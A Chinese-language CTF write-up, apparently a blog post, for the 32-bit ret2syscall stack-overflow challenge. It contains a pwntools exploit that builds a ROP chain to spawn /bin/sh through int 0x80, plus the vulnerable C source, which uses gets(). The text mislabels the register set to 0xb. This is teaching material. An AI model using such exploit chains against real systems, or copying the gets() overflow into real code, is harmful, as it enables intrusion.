---
layout:     post
title:      ret2syscall
subtitle:   解题思路
date:       2018-07-05
author:     Mao
header-img: img/home-bg-geek.jpg
catalog: true
tags:
    - PWN
    - 栈溢出
---



## 所需环境

环境要求

> ubuntu 16.04 64bit
>
> python 2.7



所需工具

> pwntools
>
> gdb-peda
>
> 32位 ida





## 分析过程

这里需要注意一点，ret2syscall是静态编译的

```
file ret2syscall

ret2syscall: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked
```



只开了NX堆栈不可执行保护

```
checksec ret2syscall
[*] '/home/hello/Desktop/test/ret2syscall/ret2syscall'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```





## 解题思路

思路

ida打开程序，发现没有system函数，因为是静态编译又不能调用libc中的函数，考虑一下int 0x80[系统调用](https://syscalls.kernelgrok.com)

```
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
```

payload中，ebx=0xb对应系统调用表中的sys_execve，edx、ecx为0即可，ebx存/bin/sh的字符串地址



exp.py

```python
#!/usr/bin/env python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```



xxx.c

```c
#include <stdio.h>
#include <stdlib.h>

char *shell = "/bin/sh";

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf("This time, no system() and NO SHELLCODE!!!\n");
    printf("What do you plan to do?\n");
    gets(buf);

    return 0;
}
```



## 总结



